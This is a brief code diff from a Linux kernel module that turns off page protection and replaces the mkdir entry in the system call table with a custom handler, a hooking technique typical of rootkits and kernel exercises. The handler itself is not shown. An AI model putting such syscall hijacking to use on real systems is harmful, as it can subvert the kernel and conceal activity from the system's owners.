@@ -81,7 +81,7 @@ static int __init mod_start(void)
 
 	disable_page_protection();
 
-	ref_sys_mkdir = (void *)sys_call_table[__NR_mkdir];
+	ref_sys_mkdir = &sys_mkdir;//(void *)sys_call_table[__NR_mkdir];
 	sys_call_table[__NR_mkdir] = (unsigned long *)new_sys_mkdir;
 	
 	enable_page_protection();
